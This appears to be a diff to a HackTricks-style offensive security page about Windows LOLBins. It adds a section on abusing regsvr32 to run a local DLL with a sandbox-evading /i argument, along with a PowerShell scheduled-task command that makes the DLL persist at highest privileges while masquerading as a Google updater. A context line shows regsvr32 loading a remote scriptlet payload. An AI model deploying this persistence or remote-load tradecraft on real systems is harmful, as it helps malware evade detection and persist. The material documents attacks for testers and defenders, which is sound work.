@@ -267,7 +267,27 @@ regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
 
 **Detected by defender**
 
-#### Regsvr32 -sct
+#### Regsvr32 – arbitrary DLL export with /i argument (gatekeeping & persistence)
+
+Besides loading remote scriptlets (`scrobj.dll`), `regsvr32.exe` will load a local DLL and invoke its `DllRegisterServer`/`DllUnregisterServer` exports. Custom loaders frequently abuse this to execute arbitrary code while blending with a signed LOLBin. Two tradecraft notes seen in the wild:
+
+- Gatekeeping argument: the DLL exits unless a specific switch is passed via `/i:<arg>`, e.g. `/i:--type=renderer` to mimic Chromium renderer children. This reduces accidental execution and frustrates sandboxes.
+- Persistence: schedule `regsvr32` to run the DLL with silent + high privileges and the required `/i` argument, masquerading as an updater task:
+  ```powershell
+  Register-ScheduledTask \
+    -Action (New-ScheduledTaskAction -Execute "regsvr32" -Argument "/s /i:--type=renderer \"%APPDATA%\Microsoft\SystemCertificates\<name>.dll\"") \
+    -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 1)) \
+    -TaskName 'GoogleUpdaterTaskSystem196.6.2928.90.{FD10B0DF-...}' \
+    -TaskPath '\\GoogleSystem\\GoogleUpdater' \
+    -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit 0 -DontStopOnIdleEnd) \
+    -RunLevel Highest
+  ```
+
+See also: ClickFix clipboard‑to‑PowerShell variant that stages a JS loader and later persists with `regsvr32`.
+{{#ref}}
+../../generic-methodologies-and-resources/phishing-methodology/clipboard-hijacking.md
+{{#endref}}
+
 
 [**From here**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)
 
@@ -555,6 +575,7 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) PS console with some offensive
 - [https://www.hackingarticles.in/koadic-com-command-control-framework/](https://www.hackingarticles.in/koadic-com-command-control-framework/)
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 - [https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
 
 {{#include ../../banners/hacktricks-training.md}}
 
